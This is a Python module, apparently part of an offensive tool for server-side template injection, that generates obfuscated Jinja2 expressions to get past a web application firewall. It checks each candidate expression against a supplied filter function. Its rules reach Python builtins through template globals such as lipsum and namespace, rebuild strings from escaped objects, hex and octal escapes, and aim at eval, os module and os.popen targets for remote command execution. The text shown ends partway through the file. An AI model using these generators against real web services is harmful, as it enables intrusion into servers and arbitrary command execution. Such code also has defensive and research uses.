"""
生成和要求相符合的表达式，如('a'+'b')
生成过程为接受一个生成目标（如`(STRING, 'ab')`），遍历对应的生成规则expression_gen，利用waf函数
递归检查生成规则是否符合，并最终生成一个字符串形式的表达式
expression_gen：所有表达式生成规则
    接受一个生成目标，并返回一个生成目标的列表
    比如说接收(STRING, 'ab')，返回[(LITERAL, '"a"'), (LITERAL, '"b"')]
    也就是将一个生成目标“展开成”一系列生成目标
PayloadGen：将用户提供的生成目标一层层展开，并使用WAF检测展开后是否可以通过WAF，然后
    根据展开结果返回相应的表达式。
"""

# pylint: skip-file
# flake8: noqa

import re
import time
import logging
import sys

from collections import defaultdict
from typing import (
    Callable,
    DefaultDict,
    List,
    Dict,
    TypeVar,
    Union,
    Any,
    Tuple,
)

from .colorize import colored
from .const import *

ContextVariable = Dict[str, Any]

if sys.version_info >= (3, 8):
    from typing import Literal

    LiteralTarget = Tuple[Literal["literal"], str]
    UnsatisfiedTarget = Tuple[Literal["unsatisfied"],]
    OneofTarget = Tuple[Literal["oneof"], List["Target"]]
    WithContextVarTarget = Tuple[Literal["with_context_var"], str]
    FlaskContextVarTarget = Tuple[Literal["flask_context_var"], str]
    ZeroTarget = Tuple[Literal["zero"],]
    PositiveIntegerTarget = Tuple[Literal["positive_integer"], int]
    IntegerTarget = Tuple[Literal["integer"], int]
    StringConcatTarget = Tuple[Literal["string_string_concat"],]
    StringPercentTarget = Tuple[Literal["string_percent"],]
    StringPercentLowerCTarget = Tuple[Literal["string_percent_lower_c"],]
    StringUnderlineTarget = Tuple[Literal["string_underline"],]
    StringLowerCTarget = Tuple[Literal["string_lower_c"],]
    StringManyPercentLowerCTarget = Tuple[Literal["string_many_percent_lower_c"], int]
    StringManyFormatCTarget = Tuple[Literal["string_many_format_c"], int]
    CharTarget = Tuple[Literal["char"], str]
    StringTarget = Tuple[Literal["string"], str]
    FormularSumTarget = Tuple[Literal["formular_sum"], List[int]]
    AttributeTarget = Tuple[Literal["attribute"], "Target", str]
    ItemTarget = Tuple[Literal["item"], "Target", str]
    ChassAttributeTarget = Tuple[Literal["class_attribute"], "Target", str]
    ChainedAttriuteItemTarget = Tuple[Literal["chained_attribute_item"], ...]
    ImportFuncTarget = Tuple[Literal["import_func"],]
    EvalFuncTarget = Tuple[Literal["eval_func"],]
    EvalTarget = Tuple[Literal["eval"], str]
    ConfigTarget = Tuple[Literal["config"],]
    ModuleOSTarget = Tuple[Literal["module_os"],]
    OSPopenObj = Tuple[Literal["os_popen_obj"],]
    OSPopenRead = Tuple[Literal["os_popen_read"],]
    # Target = LiteralTarget
    Target = Union[
        LiteralTarget,
        UnsatisfiedTarget,
        OneofTarget,
        WithContextVarTarget,
        FlaskContextVarTarget,
        ZeroTarget,
        PositiveIntegerTarget,
        IntegerTarget,
        StringConcatTarget,
        StringPercentTarget,
        StringPercentLowerCTarget,
        StringUnderlineTarget,
        StringLowerCTarget,
        StringManyPercentLowerCTarget,
        StringManyFormatCTarget,
        CharTarget,
        StringTarget,
        FormularSumTarget,
        AttributeTarget,
        ItemTarget,
        ChassAttributeTarget,
        ChainedAttriuteItemTarget,
        ImportFuncTarget,
        EvalFuncTarget,
        EvalTarget,
        ConfigTarget,
        ModuleOSTarget,
        OSPopenObj,
        OSPopenRead,
    ]
else:
    LiteralTarget = Tuple
    UnsatisfiedTarget = Tuple
    OneofTarget = Tuple
    WithContextVarTarget = Tuple
    FlaskContextVarTarget = Tuple
    Target = Tuple


ExpressionGeneratorReturn = TypeVar("ExpressionGeneratorReturn", bound=List[Target])
ExpressionGenerator = Callable[..., ExpressionGeneratorReturn]
PayloadGeneratorResult = Tuple[str, ContextVariable]

expression_gens: DefaultDict[str, List[ExpressionGenerator]] = defaultdict(list)
logger = logging.getLogger("payload_gen")

gen_weight_default = {
    "gen_string_percent_lower_c_concat": 1,
    "gen_string_lower_c_joinerbatch": 1,
    "gen_string_percent_urlencode2": 1,
    "gen_string_concat1": 1,
    "gen_string_concat2": 1,
    "gen_string_formatpercent": 1,
    "gen_attribute_attrfilter": 1,
    "gen_item_dunderfunc": 1,
}


def expression_gen(f: ExpressionGenerator):
    gen_type = re.match("gen_([a-z_]+)_([a-z0-9]+)", f.__name__)
    if not gen_type:
        raise Exception(f"Error found when register payload generator {f.__name__}")
    expression_gens[gen_type.group(1)].append(f)


def hashable(o):
    try:
        _ = hash(o)
        return True
    except Exception:
        return False


class PayloadGenerator:
    """生成一个表达式，如('a'+'b')
    其会遍历对应的expression_gen，依次“展开”生成目标为一个生成目标的列表，递归地
    将每一个元素转为payload，拼接在一起并使用WAF函数检测是否合法。
    """

    def __init__(
        self,
        waf_func: Callable[[str], bool],
        context: Union[Dict, None] = None,
        callback: Union[Callable[[str, Dict], None], None] = None,
        detect_mode: str = DETECT_MODE_ACCURATE,
        environment: str = ENVIRONMENT_FLASK,
    ):
        self.waf_func = waf_func
        self.context = context if context else {}
        self.cache = {}
        # 给.generate_by_list的列表，指定每一个生成目标应该使用什么函数生成
        self.generate_funcs: List[
            Tuple[
                Callable[[Target], bool],
                Callable[[Target], Union[PayloadGeneratorResult, None]],
            ]
        ]
        self.generate_funcs = [  # type: ignore
            (
                (lambda target: target[0] == LITERAL),
                self.literal_generate,
            ),
            ((lambda target: target[0] == UNSATISFIED), self.unsatisfied_generate),
            ((lambda target: target[0] == ONEOF), self.oneof_generate),
            (
                (lambda target: target[0] == WITH_CONTEXT_VAR),
                self.with_context_var_generate,
            ),
            (
                (lambda target: target[0] == FLASK_CONTEXT_VAR),
                self.flask_context_var_generate,
            ),
            (
                (lambda target: hashable(target) and target in self.cache),
                (lambda target: self.cache[target]),
            ),
            ((lambda target: True), self.common_generate),
        ]
        self.used_count = defaultdict(int)
        self.detect_mode = detect_mode
        if detect_mode == DETECT_MODE_FAST:
            for k in gen_weight_default:
                self.used_count[k] += gen_weight_default[k]
        self.environment = environment
        self.callback = callback if callback else (lambda x, y: None)
    
    def generate_by_list(
        self, targets: List[Target]
    ) -> Union[PayloadGeneratorResult, None]:
        """根据一个生成目标的列表生成payload并使用WAF测试

        Args:
            targets (List[Target]): 生成目标的列表

        Returns:
            Union[PayloadGeneratorResult, None]: 生成结果，其包含payload和payload用到的上下文中的变量
        """
        str_result, used_context = "", {}
        for target in targets:
            for checker, runner in self.generate_funcs:
                if not checker(target):
                    continue
                result = runner(target)
                if result is None:
                    return None
                s, c = result
                str_result += s
                used_context.update(c)
                break
            else:
                raise Exception("it shouldn't runs this line")
        if not self.waf_func(str_result):
            return None
        return str_result, used_context

    def literal_generate(
        self, target: LiteralTarget
    ) -> Union[PayloadGeneratorResult, None]:
        """为literal类型的生成目标生成payload

        Args:
            target (LiteralTarget): 生成目标

        Returns:
            Union[PayloadGeneratorResult, None]: 生成结果
        """
        if self.detect_mode == DETECT_MODE_ACCURATE and not self.waf_func(target[1]):
            return None
        return (target[1], {})

    def unsatisfied_generate(self, target: UnsatisfiedTarget) -> None:
        """直接拒绝类型为unsatisfied的生成目标"""
        return None

    def oneof_generate(
        self, target: OneofTarget
    ) -> Union[PayloadGeneratorResult, None]:
        """生成类型为oneof的生成目标，遍历其中的每一个子目标并选择其中一个生成

        Args:
            target (OneofTarget): oneof生成目标，其中有多个生成目标列表

        Returns:
            Union[PayloadGeneratorResult, None]: 生成结果
        """
        _, *alternative_targets = target
        for req in alternative_targets:
            ret = self.generate_by_list(req)
            if ret is not None:
                return ret
        return None

    def with_context_var_generate(
        self, target: WithContextVarTarget
    ) -> Union[PayloadGeneratorResult, None]:
        """生成类型为with_context_var的生成目标，将其中包含的变量名加入到已经使用的变量中

        Args:
            target (WithContextVarTarget): 生成目标

        Returns:
            _type_: 生成结果
        """
        return ("", {target[1]: self.context[target[1]]})

    def flask_context_var_generate(
        self, target: FlaskContextVarTarget
    ) -> Union[PayloadGeneratorResult, None]:
        """生成类型为flask_context_var_generate的生成目标，将其中包含的变量名加入到已经使用的变量中

        Args:
            target (FlaskContextVarTarget): 生成目标

        Returns:
            _type_: 生成结果
        """
        if self.environment != ENVIRONMENT_FLASK:
            return None
        return (target[1], {})

    def common_generate(self, gen_req: Target) -> Union[PayloadGeneratorResult, None]:
        """为剩下所有类型的生成目标生成对应的payload, 遍历对应的expression_gen，拿到
        对应的生成目标列表并尝试使用这个列表生成payload

        Args:
            gen_req (Target): 生成目标

        Returns:
            Union[PayloadGeneratorResult, None]: 生成结果
        """
        gen_type, *args = gen_req
        if gen_type not in expression_gens or len(expression_gens[gen_type]) == 0:
            logger.error("Unknown type: %s", gen_type)
            return None

        gens = expression_gens[gen_type].copy()
        if self.detect_mode == DETECT_MODE_FAST:
            gens.sort(key=lambda gen: self.used_count[gen.__name__], reverse=True)
        for gen in gens:
            gen_ret: List[Target] = gen(self.context, *args)
            ret = self.generate_by_list(gen_ret)
            if ret is None:
                if hashable(gen_req):
                    self.cache[gen_req] = ret
                continue
            result = ret[0]
            self.callback(
                CALLBACK_GENERATE_PAYLOAD,
                {
                    "gen_type": gen_type,
                    "args": args,
                    "gen_ret": gen_ret,
                    "payload": result,
                },
            )
            # 为了日志的简洁，仅打印一部分日志
            if gen_type in (INTEGER, STRING) and result != str(args[0]):
                logger.info(
                    "{great}, {gen_type}({args_repl}) can be {result}".format(
                        great=colored("green", "Great"),
                        gen_type=colored("yellow", gen_type, bold=True),
                        args_repl=colored(
                            "yellow", ", ".join(repr(arg) for arg in args)
                        ),
                        result=colored("blue", result),
                    )
                )

            elif gen_type in (
                EVAL_FUNC,
                EVAL,
                CONFIG,
                MODULE_OS,
                OS_POPEN_OBJ,
                OS_POPEN_READ,
            ):
                logger.info(
                    "{great}, we generate {gen_type}({args_repl})".format(
                        great=colored("green", "Great"),
                        gen_type=colored("yellow", gen_type, bold=True),
                        args_repl=colored(
                            "yellow", ", ".join(repr(arg) for arg in args)
                        ),
                    )
                )

            if hashable(gen_req):
                self.cache[gen_req] = ret
            self.used_count[gen.__name__] += 1
            return ret

        logger.info(
            "{failed} generating {gen_type}({args_repl}), it might not be an issue.".format(
                failed=colored("red", "failed"),
                gen_type=gen_type,
                args_repl=", ".join(repr(arg) for arg in args),
            )
        )
        return None

    def generate(self, gen_type, *args) -> Union[str, None]:
        """提供给用户的生成接口，接收一个生成目标的类型和参数

        Args:
            gen_type (str): 生成目标的类型
            *args: 生成目标的参数

        Returns:
            Union[str, None]: 生成结果
        """
        result = self.generate_by_list([(gen_type, *args)])
        if result is None:
            return None
        s, c = result
        return s

    def generate_with_used_context(
        self, gen_type, *args
    ) -> Union[PayloadGeneratorResult, None]:
        """提供给用户的生成接口，接收一个生成目标的类型和参数

        Args:
            gen_type (str): 生成目标的类型
            *args: 生成目标的参数

        Returns:
            Union[str, None]: 生成结果（包含使用的上下文变量）
        """
        result = self.generate_by_list([(gen_type, *args)])
        if result is None:
            return None
        s, c = result
        return s, c


def generate(
    gen_type, *args, waf_func: Callable, context: Union[dict, None] = None
) -> Union[str, None]:
    payload_generator = PayloadGenerator(waf_func, context)
    return payload_generator.generate(gen_type, *args)


# ---


@expression_gen
def gen_string_string_concat_plus(context: dict) -> List[LiteralTarget]:
    return [(LITERAL, "+")]


@expression_gen
def gen_string_string_concat_wave(context: dict):
    return [(LITERAL, "~")]


# ---


@expression_gen
def gen_formular_sum_add(context, num_list):
    return [(LITERAL, "({})".format("+".join(str(n) for n in num_list)))]


@expression_gen
def gen_formular_sum_addfunc(context, num_list):
    num_list = [
        str(n) if i == 0 else ".__add__({})".format(n) for i, n in enumerate(num_list)
    ]
    return [(LITERAL, "({})".format("".join(num_list)))]


@expression_gen
def gen_formular_sum_attraddfund(context, num_list):
    num_list = [
        str(n) if i == 0 else f'|attr("\\x5f\\x5fadd\\x5f\\x5f")({n})'
        for i, n in enumerate(num_list)
    ]
    return [(LITERAL, "({})".format("".join(num_list)))]


@expression_gen
def gen_formular_sum_tuplesum(context, num_list):
    if len(num_list) == 1:
        return [(LITERAL, str(num_list[0]))]
    payload = "(({})|sum)".format(",".join(num_list))
    return [(LITERAL, payload)]


# ---


@expression_gen
def gen_zero_literal(context: dict):
    return [(LITERAL, "0")]


@expression_gen
def gen_zero_2(context: dict):
    return [(LITERAL, "({}|int)")]


@expression_gen
def gen_zero_3(context: dict):
    return [(LITERAL, "(g|urlencode|length)")]


@expression_gen
def gen_zero_4(context: dict):
    return [(LITERAL, "({}|urlencode|count)")]


# ---


@expression_gen
def gen_positive_integer_simple(context: dict, value: int):
    if value < 0:
        return [(UNSATISFIED,)]
    return [(LITERAL, str(value))]


@expression_gen
def gen_positive_integer_hex(context: dict, value: int):
    if value < 0:
        return [(UNSATISFIED,)]
    return [(LITERAL, hex(value))]


@expression_gen
def gen_positive_integer_sum(context: dict, value: int):
    if value < 0:
        return [(UNSATISFIED,)]

    ints = [
        (var_name, var_value)
        for var_name, var_value in context.items()
        if isinstance(var_value, int) and var_value > 0
    ]

    if ints == []:
        return [(UNSATISFIED,)]

    ints.sort(key=lambda pair: pair[1], reverse=True)
    value_left = value
    payload_vars = []
    while value_left != 0:
        while ints and ints[0][1] > value_left:
            ints = ints[1:]
        if not ints:
            return [(UNSATISFIED,)]
        value_left -= ints[0][1]
        payload_vars.append(ints[0][0])

    return [(FORMULAR_SUM, tuple(payload_vars))] + [
        (WITH_CONTEXT_VAR, v) for v in payload_vars
    ]


@expression_gen
def gen_positive_integer_recurdivided(context: dict, value: int):
    if value <= 6:
        return [(UNSATISFIED,)]
    lst = [(LITERAL, "+"), (POSITIVE_INTEGER, value % 6)] if value % 6 != 0 else []
    return (
        [
            (LITERAL, "("),
            (POSITIVE_INTEGER, value // 6),
            (LITERAL, "*"),
            (POSITIVE_INTEGER, 6),
        ]
        + lst
        + [
            (LITERAL, ")"),
        ]
    )


@expression_gen
def gen_positive_integer_recurmulitiply(context: dict, value: int):
    xs = [x for x in range(3, value // 2) if value % x == 0]
    if xs == []:
        return [(UNSATISFIED,)]
    return [
        (
            ONEOF,
            *[
                [
                    (LITERAL, "("),
                    (POSITIVE_INTEGER, value // x),
                    (LITERAL, "*"),
                    (POSITIVE_INTEGER, x),
                    (LITERAL, ")"),
                ]
                for x in xs[::-1]
            ],
        )
    ]


@expression_gen
def gen_positive_integer_dictlength(context: dict, value: int):
    return [(LITERAL, "(dict({}=x)|join|length)".format("x" * value))]


@expression_gen
def gen_positive_integer_length(context: dict, value: int):
    return [(LITERAL, "(({},)|length)".format(",".join("x" * value)))]


@expression_gen
def gen_positive_integer_length2(context: dict, value: int):
    return [(LITERAL, "(({},).__len__( ))".format(",".join("x" * value)))]


@expression_gen
def gen_positive_integer_truesum1(context: dict, value: int):
    return [(LITERAL, "({})".format("+".join(["True"] * value)))]


@expression_gen
def gen_positive_integer_truesum2(context: dict, value: int):
    return [(LITERAL, "(({},)|sum)".format(",".join(["True"] * value)))]


# ---


@expression_gen
def gen_integer_literal(context: dict, value: int):
    return [(LITERAL, str(value))]


@expression_gen
def gen_integer_context(context: dict, value: int):
    if value not in context.values():
        return [(UNSATISFIED,)]
    v = [k for k, v in context.items() if v == value][0]
    return [
        (LITERAL, v),
        (WITH_CONTEXT_VAR, v),
    ]


@expression_gen
def gen_integer_zero(context: dict, value: int):
    if value != 0:
        return [(UNSATISFIED,)]
    return [(ZERO,)]


@expression_gen
def gen_integer_positive(context: dict, value: int):
    if value <= 0:
        return [(UNSATISFIED,)]
    return [(POSITIVE_INTEGER, value)]


@expression_gen
def gen_integer_negative(context: dict, value: int):
    if value >= 0:
        return [(UNSATISFIED,)]
    return [(LITERAL, "-"), (POSITIVE_INTEGER, abs(value))]


# @req_gen
# def gen_integer_unicode(context: dict, value: int):
#     dis = ord("０") - ord("0")
#     return [
#         (LITERAL, "".join(chr(ord(c) + dis) for c in str(value)))
#     ]


@expression_gen
def gen_integer_subtract(context: dict, value: int):
    ints = [
        (var_name, var_value)
        for var_name, var_value in context.items()
        if isinstance(var_value, int) and var_value > 0
    ]

    if ints == []:
        return [(UNSATISFIED,)]

    ints.sort(key=lambda pair: pair[1], reverse=True)
    bigger = [pair for pair in ints if pair[1] >= value]
    if not bigger:
        return [(UNSATISFIED,)]
    to_sub_name, to_sub_value = min(bigger, key=lambda pair: pair[1])
    ints = [pair for pair in ints if pair[1] <= to_sub_value]
    value_left = to_sub_value - value

    sub_vars = []
    while value_left != 0:
        while ints and ints[0][1] > value_left:
            ints = ints[1:]
        if not ints:
            return [(UNSATISFIED,)]
        value_left -= ints[0][1]
        sub_vars.append(ints[0][0])
    return [
        (
            LITERAL,
            "({})".format(
                "-".join(
                    [
                        to_sub_name,
                    ]
                    + sub_vars
                )
            ),
        )
    ] + [
        (WITH_CONTEXT_VAR, v)
        for v in [
            to_sub_name,
        ]
        + sub_vars
    ]


# ---


@expression_gen
def gen_string_percent_literal1(context):
    return [(LITERAL, "'%'")]


@expression_gen
def gen_string_percent_literal2(context):
    return [(LITERAL, '"%"')]


@expression_gen
def gen_string_percent_context(context):
    if "%" not in context.values():
        return [(UNSATISFIED,)]
    v = [k for k, v in context.items() if v == "%"][0]
    return [(LITERAL, v)] + [(WITH_CONTEXT_VAR, v)]


@expression_gen
def gen_string_percent_urlencode1(context):
    return [(LITERAL, "(lipsum()|urlencode|first)")]


@expression_gen
def gen_string_percent_urlencode2(context):
    return [(LITERAL, "({}|escape|urlencode|first)")]


@expression_gen
def gen_string_percent_lipsum(context):
    return [
        (
            LITERAL,
            "(lipsum[(lipsum|escape|batch(22)|list|first|last)*2"
            + "+dict(globals=x)|join+(lipsum|escape|batch(22)|list|first|last)*2]"
            + "[(lipsum|escape|batch(22)|list|first|last)*2+dict(builtins=x)"
            + "|join+(lipsum|escape|batch(22)|list|first|last)*2][dict(chr=x)|join](37))",
        )
    ]


@expression_gen
def gen_string_percent_lipsum2(context):
    return [(LITERAL, "(lipsum['__glob''als__']['__builti''ns__']['chr'](37))")]


@expression_gen
def gen_string_percent_namespace(context):
    return [
        (
            LITERAL,
            "(namespace['__ini''t__']['__glob''al''s__']['__builti''ns__']['chr'](",
        ),
        (INTEGER, 37),
        (LITERAL, "))"),
    ]


@expression_gen
def gen_string_percent_lipsumcomplex(context):
    return [
        (LITERAL, "(lipsum[(lipsum|escape|batch("),
        (INTEGER, 22),
        (LITERAL, ")|list|first|last)*"),
        (INTEGER, 2),
        (LITERAL, "+dict(globals=x)|join+(lipsum|escape|batch("),
        (INTEGER, 22),
        (LITERAL, ")|list|first|last)*"),
        (INTEGER, 2),
        (LITERAL, "][(lipsum|escape|batch("),
        (INTEGER, 22),
        (LITERAL, ")|list|first|last)*"),
        (INTEGER, 2),
        (LITERAL, "+dict(builtins=x)|join+(lipsum|escape|batch("),
        (INTEGER, 22),
        (LITERAL, ")|list|first|last)*"),
        (INTEGER, 2),
        (LITERAL, "][dict(chr=x)|join]("),
        (INTEGER, 37),
        (LITERAL, "))"),
    ]


@expression_gen
def gen_string_percent_urlencodelong(context):
    return [
        (
            LITERAL,
            "((lipsum,)|map(((lipsum|string|list|batch(3)|first|last)"
            + "~(lipsum|string|list|batch(15)|first|last)"
            + "~(lipsum|string|list|batch(20)|first|last)"
            + "~(x|pprint|list|batch(4)|first|last)"
            + "~(x|pprint|list|batch(2)|first|last)"
            + "~(lipsum|string|list|batch(5)|first|last)"
            + "~(lipsum|string|list|batch(8)|first|last)"
            + "~(x|pprint|list|batch(3)|first|last)"
            + "~(x|pprint|list|batch(4)|first|last)))|list|first|first)",
        )
    ]


# ---


@expression_gen
def gen_string_lower_c_literal1(context):
    return [(LITERAL, "'c'")]


@expression_gen
def gen_string_lower_c_literal2(context):
    return [(LITERAL, '"c"')]


@expression_gen
def gen_string_lower_c_joindict(context):
    return [(LITERAL, "(dict(c=x)|join)")]


@expression_gen
def gen_string_lower_c_lipsumurlencode(context):
    return [(LITERAL, "(lipsum|pprint|first|urlencode|last|lower)")]


@expression_gen
def gen_string_lower_c_lipsumbatch(context):
    return [
        (LITERAL, "(lipsum|escape|batch("),
        (INTEGER, 8),
        (LITERAL, ")|first|last)"),
    ]


@expression_gen
def gen_string_lower_c_joinerbatch(context):
    return [
        (LITERAL, "(joiner|string|batch("),
        (INTEGER, 2),
        (LITERAL, ")|first|last)"),
    ]


@expression_gen
def gen_string_lower_c_namespacebatch(context):
    return [
        (LITERAL, "(namespace|escape|batch("),
        (INTEGER, 36),
        (LITERAL, ")|first|last)"),
    ]


# ---


@expression_gen
def gen_string_percent_lower_c_literal1(context):
    return [(LITERAL, "'%c'")]


@expression_gen
def gen_string_percent_lower_c_literal2(context):
    return [(LITERAL, '"%c"')]


@expression_gen
def gen_string_percent_lower_c_concat(context):
    return [
        (LITERAL, "("),
        (STRING_PERCENT,),
        (STRING_STRING_CONCAT,),
        (STRING_LOWERC,),
        (LITERAL, ")"),
    ]


@expression_gen
def gen_string_percent_lower_c_dictjoin(context):
    # "(dict([('%',x),('c',x)])|join)"
    return [
        (LITERAL, "(dict([("),
        (STRING_PERCENT,),
        (LITERAL, ",x),("),
        (STRING_LOWERC,),
        (LITERAL, ",x)])|join)"),
    ]


@expression_gen
def gen_string_percent_lower_c_listjoin(context):
    # "(['%','c']|join)"
    return [
        (LITERAL, "(["),
        (STRING_PERCENT,),
        (LITERAL, ","),
        (STRING_LOWERC,),
        (LITERAL, "]|join)"),
    ]


@expression_gen
def gen_string_percent_lower_c_tuplejoin(context):
    # "(('%','c')|join)"
    return [
        (LITERAL, "(("),
        (STRING_PERCENT,),
        (LITERAL, ","),
        (STRING_LOWERC,),
        (LITERAL, ")|join)"),
    ]


@expression_gen
def gen_string_percent_lower_c_cycler(context):
    # cycler|pprint|list|pprint|urlencode|batch(%s)|first|join|batch(%s)|list|last|reverse|join|lower
    return [
        (LITERAL, "(cycler|pprint|list|pprint|urlencode|batch("),
        (INTEGER, 10),
        (LITERAL, ")|first|join|batch("),
        (INTEGER, 8),
        (LITERAL, ")|list|last|reverse|join|lower)"),
    ]


# ---


@expression_gen
def gen_string_many_percent_lower_c_multiply(context, count: int):
    return [(STRING_PERCENT_LOWER_C,), (LITERAL, "*"), (INTEGER, count)]


@expression_gen
def gen_string_many_percent_lower_c_literal1(context, count: int):
    return [(LITERAL, "'"), (LITERAL, "%c" * count), (LITERAL, "'")]


@expression_gen
def gen_string_many_percent_lower_c_literal2(context, count: int):
    return [(LITERAL, '"'), (LITERAL, "%c" * count), (LITERAL, '"')]


@expression_gen
def gen_string_many_percent_lower_c_concat(context, count: int):
    l = [
        [
            (STRING_PERCENT_LOWER_C,),
        ]
        if i == 0
        else [
            (STRING_STRING_CONCAT,),
            (STRING_PERCENT_LOWER_C,),
        ]
        for i in range(count)
    ]
    return [item for lst in l for item in lst]


# ---


@expression_gen
def gen_string_underline_literal1(context):
    return [(LITERAL, "'_'")]


@expression_gen
def gen_string_underline_literal2(context):
    return [(LITERAL, '"_"')]


@expression_gen
def gen_string_underline_context(context: dict):
    if "_" in context.values():
        v = [k for k, v in context.items() if v == "_"][0]
        return [(LITERAL, v)] + [(WITH_CONTEXT_VAR, v)]
    return [(UNSATISFIED,)]


@expression_gen
def gen_string_underline_lipsum(context):
    return [
        (LITERAL, "(lipsum|escape|batch("),
        (INTEGER, 22),
        (LITERAL, ")|list|first|last)"),
    ]


@expression_gen
def gen_string_underline_tupleselect(context):
    return [
        (LITERAL, "(()|select|string|batch("),
        (INTEGER, 25),
        (LITERAL, ")|first|last)"),
    ]


@expression_gen
def gen_string_many_format_c_complex(context, num):
    parts = "(({c})*{l})".format(
        c="{1:2}|string|replace({1:2}|string|batch(4)|first|last,{}|join)|replace(1|string,{}|join)|replace(2|string,LOWERC)",
        l=num,
    ).partition("LOWERC")
    return [(LITERAL, parts[0]), (STRING_LOWERC,), (LITERAL, parts[2])]


# ---


@expression_gen
def gen_char_literal1(context, c):
    return [(LITERAL, f"'{c}'" if c != "'" else "'\\''")]


@expression_gen
def gen_char_literal2(context, c):
    return [(LITERAL, f'"{c}"' if c != '"' else '"\\""')]


@expression_gen
def gen_char_select(context, c):
    char_patterns = {
        "((dict|trim|list)[INDEX])": {
            1: "c",
            2: "l",
            3: "a",
            4: "s",
            5: "s",
            6: " ",
            8: "d",
            9: "i",
            10: "c",
            11: "t",
        },
        "(({}|select()|trim|list)[INDEX])": {
            1: "g",
            2: "e",
            3: "n",
            4: "e",
            5: "r",
            6: "a",
            7: "t",
            8: "o",
            9: "r",
            10: " ",
            11: "o",
            12: "b",
            13: "j",
            14: "e",
            15: "c",
            16: "t",
            17: " ",
            18: "s",
            19: "e",
            20: "l",
            21: "e",
            22: "c",
            23: "t",
            24: "_",
            25: "o",
            26: "r",
            27: "_",
            28: "r",
            29: "e",
            30: "j",
            31: "e",
            32: "c",
            33: "t",
            34: " ",
            35: "a",
            36: "t",
        },
        "((lipsum|trim|list)[INDEX])": {
            1: "f",
            2: "u",
            3: "n",
            4: "c",
            5: "t",
            6: "i",
            7: "o",
            8: "n",
            9: " ",
            10: "g",
            11: "e",
            12: "n",
            13: "e",
            14: "r",
            15: "a",
            16: "t",
            17: "e",
            18: "_",
            19: "l",
            20: "o",
            21: "r",
            22: "e",
            23: "m",
            24: "_",
            25: "i",
            26: "p",
            27: "s",
            28: "u",
            29: "m",
            30: " ",
            31: "a",
            32: "t",
            33: " ",
            34: "0",
            35: "x",
            36: "7",
        },
        "((()|trim|list)[INDEX])": {0: "(", 1: ")"},
    }
    for pattern, d in char_patterns.items():
        for index, value in d.items():
            if value == c:
                return [(LITERAL, pattern.replace("INDEX", str(index)))]
    return [(UNSATISFIED,)]


@expression_gen
def gen_char_dict(context, c):
    if not re.match("[A-Za-z]", c):
        return [(UNSATISFIED,)]
    return [(LITERAL, f"(dict({c}=x)|join)")]


@expression_gen
def gen_char_num(context, c):
    if not re.match("[0-9]", c):
        return [(UNSATISFIED,)]
    return [
        (
            LITERAL,
            f"((",
        ),
        (INTEGER, int(c)),
        (LITERAL, ").__str__( ))"),
    ]


@expression_gen
def gen_char_num2(context, c):
    if not re.match("[0-9]", c):
        return [(UNSATISFIED,)]
    return [
        (
            LITERAL,
            f"((",
        ),
        (INTEGER, int(c)),
        (LITERAL, ")|string)"),
    ]


# ---
# 以下的gen_string会互相依赖，但是产生互相依赖时传入的字符串长度会减少所以不会发生无限调用


@expression_gen
def gen_string_1(context: dict, value: str):
    chars = [c if c != "'" else "\\'" for c in value]
    return [(LITERAL, "'{}'".format("".join(chars)))]


@expression_gen
def gen_string_2(context: dict, value: str):
    chars = [c if c != '"' else '\\"' for c in value]
    return [(LITERAL, '"{}"'.format("".join(chars)))]



@expression_gen
def gen_string_context(context: dict, value: str):
    if value not in context.values():
        return [(UNSATISFIED,)]
    v = [k for k, v in context.items() if v == value][0]
    return [(LITERAL, v)] + [(WITH_CONTEXT_VAR, v)]


@expression_gen
def gen_string_twostringconcat(context: dict, value: str):
    if len(value) <= 2 or len(value) > 20:
        return [(UNSATISFIED,)]
    return [
        (LITERAL, "'"),  # test quotes first
        (
            ONEOF,
            *[
                [
                    (LITERAL, "{}'".format(value[:i].replace("'", "\\'"))),
                    (LITERAL, "'{}'".format(value[i:].replace("'", "\\'"))),
                ]
                for i in range(1, len(value) - 1)
            ],
        ),
    ]


@expression_gen
def gen_string_twostringconcat2(context: dict, value: str):
    if len(value) <= 2 or len(value) > 20:
        return [(UNSATISFIED,)]
    return [
        (LITERAL, '"'),  # test quotes first
        (
            ONEOF,
            *[
                [
                    (LITERAL, '{}"'.format(value[:i].replace('"', '\\"'))),
                    (LITERAL, '"{}"'.format(value[i:].replace('"', '\\"'))),
                ]
                for i in range(1, len(value) - 1)
            ],
        ),
    ]



@expression_gen
def gen_string_removedunder(context: dict, value: str):
    if not re.match("^__[A_Za-z0-9_]+__$", value):
        return [(UNSATISFIED,)]
    return [
        (STRING_UNDERLINE,),
        (LITERAL, "*"),
        (INTEGER, 2),
        (STRING_STRING_CONCAT,),
        (STRING, value[2:-2]),
        (STRING_STRING_CONCAT,),
        (STRING_UNDERLINE,),
        (LITERAL, "*"),
        (INTEGER, 2),
    ]



# 以下规则生成的payload显著长于原string

@expression_gen
def gen_string_x1(context: dict, value: str):
    if any(ord(c) >= 128 for c in value):
        return [(UNSATISFIED,)]
    target = "".join("\\x" + hex(ord(c))[2:] for c in value)
    return [(LITERAL, '"{}"'.format(target))]


@expression_gen
def gen_string_x2(context: dict, value: str):
    if any(ord(c) >= 128 for c in value):
        return [(UNSATISFIED,)]
    target = "".join("\\x" + hex(ord(c))[2:] for c in value)
    return [(LITERAL, "'{}'".format(target))]


@expression_gen
def gen_string_u1(context: dict, value: str):
    if any(ord(c) >= 128 for c in value):
        return [(UNSATISFIED,)]
    target = "".join("\\u00" + hex(ord(c))[2:] for c in value)
    return [(LITERAL, "'{}'".format(target))]


@expression_gen
def gen_string_u2(context: dict, value: str):
    if any(ord(c) >= 128 for c in value):
        return [(UNSATISFIED,)]
    target = "".join("\\u00" + hex(ord(c))[2:] for c in value)
    return [(LITERAL, "'{}'".format(target))]


@expression_gen
def gen_string_o1(context: dict, value: str):
    if any(ord(c) >= 128 for c in value):
        return [(UNSATISFIED,)]
    target = "".join("\\" + oct(ord(c))[2:] for c in value)
    return [(LITERAL, "'{}'".format(target))]


@expression_gen
def gen_string_o2(context: dict, value: str):
    if any(ord(c) >= 128 for c in value):
        return [(UNSATISFIED,)]
    target = "".join("\\" + oct(ord(c))[2:] for c in value)
    return [(LITERAL, "'{}'".format(target))]


@expression_gen
def gen_string_reverse1(context: dict, value: str):
    chars = [c if c != "'" else "\\'" for c in value]
    return [(LITERAL, "'{}'[::-1]".format("".join(chars[::-1])))]


@expression_gen
def gen_string_reverse2(context: dict, value: str):
    chars = [c if c != '"' else '\\"' for c in value]
    return [(LITERAL, '"{}"[::-1]'.format("".join(chars[::-1])))]


@expression_gen
